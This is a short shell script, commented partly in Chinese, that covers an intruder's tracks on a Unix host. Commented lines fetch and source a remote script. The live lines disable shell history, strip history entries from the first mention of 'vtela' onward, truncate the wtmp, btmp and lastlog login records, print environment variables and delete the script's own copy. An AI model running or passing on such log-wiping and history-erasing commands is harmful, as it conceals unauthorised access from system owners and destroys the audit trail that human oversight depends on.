#!/bin/sh
#curl -ssL https://raw.fastgit.org/vtela/h/main/w.sh -o /tmp/w.sh
#source /tmp/w.sh
/usr/bin/mv -f $HOME/.bash_history{,.bak}
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG
export HISTFILE=/dev/null
export HISTSIZE=0
export HISTFILESIZE=0
sed -i '/vtela/,$d' $HOME/.bash_history.bak
#清理登录信息
> /var/log/wtmp
> /var/log/btmp
> /var/log/lastlog
printenv
rm -rf /tmp/w.sh
